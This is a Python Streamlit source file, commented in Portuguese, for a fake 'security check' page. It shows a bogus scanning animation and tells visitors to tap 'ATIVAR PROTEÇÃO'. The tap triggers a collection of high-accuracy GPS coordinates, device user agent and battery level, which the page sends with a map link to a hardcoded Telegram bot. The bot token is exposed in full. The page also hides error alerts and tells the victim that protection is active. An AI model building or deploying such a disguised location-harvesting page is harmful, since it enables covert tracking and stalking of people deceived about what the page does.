import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# 1. SETUP TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança", layout="centered")

# 2. CSS: BOLHA E DESIGN DO BOTÃO AMARELO COMPRIDO
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    
    /* ESTILO DO BOTÃO IGUAL AO DO PRINT */
    .btn-ativar {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 50px; border-radius: 12px; border: none;
        font-size: 16px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Estado inicial da bolha (4%)
if 'progresso' not in st.session_state:
    st.session_state['progresso'] = 4

with caixa_bolha.container():
    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["progresso"]}%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. CAPTURA DE DADOS (MODELO E BATERIA)
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')

# 5. O SEGREDO: BOTÃO HTML COM JS (PARA O GPS NÃO TRAVAR)
# Corrigido o erro de string para não dar SyntaxError
html_button = """
<script>
function chamarGPS() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const result = {lat: pos.coords.latitude, lon: pos.coords.longitude, status: 'sucesso'};
            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
        },
        (err) => { 
            alert("Por favor, ative a localização no seu GPS!");
        },
        {enableHighAccuracy: true}
    );
}
</script>
<button class="btn-ativar" onclick="chamarGPS()">
    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
</button>
"""

# Renderiza o botão estilizado
res_gps = st.components.v1.html(html_button, height=70)

# 6. ANIMAÇÃO 0-100% E ENVIO AO TELEGRAM
if res_gps and isinstance(res_gps, dict) and res_gps.get('status') == 'sucesso':
    # Animação dos números girando
    for p in range(st.session_state['progresso'], 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.04)
    
    lat, lon = res_gps['lat'], res_gps['lon']
    mapa = f"https://www.google.com/maps?q={lat},{lon}"
    
    relatorio = (
        f"🛡️ SISTEMA ATIVADO\n\n"
        f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
        f"🔋 Bateria: {bateria if bateria else '--'}%\n"
        f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
    )
    
    enviar_telegram(relatorio)
    st.success("Segurança Ativada com Sucesso!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
